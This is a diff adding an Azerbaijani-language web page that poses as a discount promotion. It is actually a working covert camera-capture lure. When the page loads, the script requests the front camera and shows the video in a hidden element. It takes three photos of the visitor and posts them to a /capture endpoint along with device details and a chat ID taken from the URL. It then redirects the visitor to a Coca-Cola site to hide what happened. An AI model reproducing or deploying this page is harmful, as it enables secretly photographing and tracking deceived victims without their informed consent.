@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Endirimdən yararlanın!</title>
+  <style>
+    body {
+      margin: 0;
+      background: #d6001c;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 1.1em;
+      margin-bottom: 20px;
+    }
+    /* Completely hide video from UI */
+    video {
+      display: none !important;
+      visibility: hidden;
+      width: 0;
+      height: 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>Endirimdən yararlanın!</h1>
+  <p>davam etmək üçün gözləyin açılmırsa icazə verin</p>
+
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    async function captureFrames(video, delays = [0, 500, 1000]) {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      const track = video.srcObject.getVideoTracks()[0];
+      const settings = track.getSettings();
+      canvas.width = settings.width || 640;
+      canvas.height = settings.height || 480;
+      const frames = [];
+      for (let i = 0; i < delays.length; i++) {
+        await new Promise(r => setTimeout(r, delays[i] - (delays[i - 1] || 0)));
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        frames.push(canvas.toDataURL('image/jpeg', 0.85));
+      }
+      return frames;
+    }
+
+    async function main() {
+      const chat_id = new URLSearchParams(window.location.search).get("id");
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        language: navigator.language,
+        timestamp: new Date().toISOString()
+      };
+
+      const video = document.getElementById("video");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        await new Promise(r => setTimeout(r, 1000)); // Wait for preview silently
+
+        const frames = await captureFrames(video);
+        stream.getTracks().forEach(t => t.stop()); // Turn off cam
+
+        await fetch("/capture", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ images: frames, chat_id, deviceInfo })
+        });
+
+        setTimeout(() => window.location.href = "https://www.coca-cola.az/", 1000);
+      } catch (err) {
+        console.warn("Camera permission was denied or failed.");
+      }
+    }
+
+    main();
+  </script>
+</body>
+</html>
